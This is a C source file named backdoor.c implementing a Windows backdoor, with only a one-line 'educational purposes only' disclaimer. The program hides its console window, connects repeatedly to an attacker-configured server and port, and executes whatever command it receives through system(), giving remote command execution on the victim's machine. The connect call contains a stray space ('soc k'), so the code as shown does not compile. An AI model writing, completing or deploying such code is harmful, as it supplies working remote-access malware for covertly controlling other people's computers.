/**
 * @file backdoor.c
 * @brief This file contains the implementation of a backdoor program.
 *
 * This program hides the console window and establishes a connection to a specified server.
 * It uses Windows API functions and socket programming to achieve this functionality.
 * 
 * @note This code is for educational purposes only. Unauthorized use of this code is illegal.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>

#pragma comment(lib, "Ws2_32.lib") // Link with Winsock library

#define ServIP "127.0.0.1" // Replace with your server IP
#define ServPort 4444      // Replace with your server port

/**
 * @brief Hides the console window.
 */
HWND stealth() {
    AllocConsole();
    HWND stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    return stealth; // Return the HWND
}

/**
 * @brief Executes a shell command. (Simplified for demonstration)
 */
void Shell(SOCKET sock) {
    char buffer[1024] = {0};
    recv(sock, buffer, 1024, 0); // Receive command from server
    system(buffer); // Execute the command
    closesocket(sock); // Close the socket after execution
    WSACleanup();
    exit(0);
}

/**
 * @brief Entry point of the program.
 *
 * This function hides the console window, initializes Winsock, creates a socket,
 * sets up the server address parameters, and connects to the server.
 *
 * @param hInstance Handle to the current instance of the application.
 * @param hPrevInstance Handle to the previous instance of the application.
 * @param lpCmdLine Command line for the application.
 * @param nCmdShow Controls how the window is to be shown.
 * @return int Status code of the application.
 */
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide console window
    stealth();

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) { // Use 2.2
        MessageBox(NULL, "WSAStartup failed", "Error", MB_OK);
        return 1;
    }

    // Create socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // Use IPPROTO_TCP
    if (sock == INVALID_SOCKET) {
        MessageBox(NULL, "Socket creation failed", "Error", MB_OK);
        WSACleanup();
        return 1;
    }

    // Set server address parameters
    struct sockaddr_in ServAddr;
    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    ServAddr.sin_port = htons(ServPort);

    // Connect to the server
    while (connect(soc k, (struct sockaddr*)&ServAddr, sizeof(ServAddr)) != 0) {
        Sleep(1000); // Sleep for 1 second to avoid excessive CPU usage
    }

    Shell(sock); // Pass the socket to the Shell function

    return 0;
}